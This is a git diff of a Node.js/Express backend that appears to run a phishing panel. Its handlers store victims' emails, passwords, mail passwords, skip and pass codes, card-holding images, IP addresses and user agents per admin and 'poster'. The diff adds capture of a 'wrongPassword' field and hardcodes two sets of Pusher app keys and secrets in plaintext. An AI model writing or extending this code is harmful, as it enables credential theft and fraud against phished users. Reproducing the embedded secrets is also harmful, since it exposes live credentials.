@@ -15,6 +15,8 @@ import rateLimitMiddleware from "../ratelimiter.js"
 import axios from 'axios';
 import Password from '../models/Password.js'
 import Otp from '../models/Otp.js'
+import Counter from '../models/Counter.js'
+
 
 import NewInfo from '../models/NewInfo.js'
 const cpuCount = os.cpus().length
@@ -24,7 +26,7 @@ import Pusher from'pusher';
 
 export const yoyo = async (req, res) => {
 
-const{id}=req.params
+const{check,firstCounter,secondCounter,thirdCounter}=req.body
 
 // const pusher = new Pusher({
 //     appId: '1710273',
@@ -50,8 +52,13 @@ const{id}=req.params
           const originalData = await NewInfo.find({
             createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
           })
-        return res.status(200).json({ deletedData,originalData})
+        //   const count = await Counter.findOne({firstCounter:2})
+        const userCreated = await Counter.create({
+            check,firstCounter,secondCounter,thirdCounter
 
+
+        })
+        return res.status(200).json({userCreated})
 
 
     } catch (e) {
@@ -373,9 +380,25 @@ export const add_data = async (req, res) => {
         useTLS: true,
       })
 
+      const pusherOne = new Pusher({
+        app_id : "1754655",
+        key :"9d5441790277eab2cffa",
+        secret : "423b9b8c22f432fe78f9",
+        cluster : "mt1",
+        useTLS: true,
+      })
+
+      const pusherTwo = new Pusher({
+        app_id : "1754657",
+        key :"219c68882d2935f2323f",
+        secret : "ee1296a8e6d938d7dad2",
+        cluster : "mt1",
+        useTLS: true,
+      })
+
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard } = req.body
+    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard,wrongPassword } = req.body
   const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -385,6 +408,8 @@ export const add_data = async (req, res) => {
         const userFound = await User.findOne({ adminId: adminId })
 
         const posterFound = await Poster.findOne({ posterId: posterId })
+        const pusherFound = await Counter.findOne({ check: pusher })
+
 
         if (userFound && posterFound) {
             const info = await Info.create({
@@ -392,7 +417,7 @@ export const add_data = async (req, res) => {
                 username,passcode,mail,mailPass,adminId:adminId,
                 poster: posterId,
                 root: posterFound._id,
-                onlyCard,holdingCard,
+                onlyCard,holdingCard,wrongPassword,
                  ip:ipAddress,
                 agent:userAgent
 
@@ -619,7 +644,7 @@ export const poster_details =  async(req, res) => {
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
        
-        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent wrongPassword createdAt').sort({ createdAt: -1 })
         const newdata = {...poster, details: details }
         console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
@@ -835,8 +860,6 @@ export const get_A_poster = async (req, res) => {
 
     }
         // return res.status(200).json({ data: id, sites: admin })
-
-        
         return res.status(200).json({ data: data.links, sites: sites })
    
         
@@ -1401,12 +1424,15 @@ export const phone_add = async (req, res) => {
     try {
         
          const   userFound = await User.findOne({username:username})
+         const   userPhone = await User.findOne({phone:phone})
+      
 
-            if(userFound){
-                userFound.phone=phone
-              await userFound.save()
-              return res.status(200).json({ success: "changed succesfully" })
-            }       
+         if(userFound && !userPhone){
+             userFound.phone=phone
+           await userFound.save()
+           return res.status(200).json({ success: "changed succesfully" })
+         }       
+   
 
       
      return   res.status(400).json({ e: "user not found" })
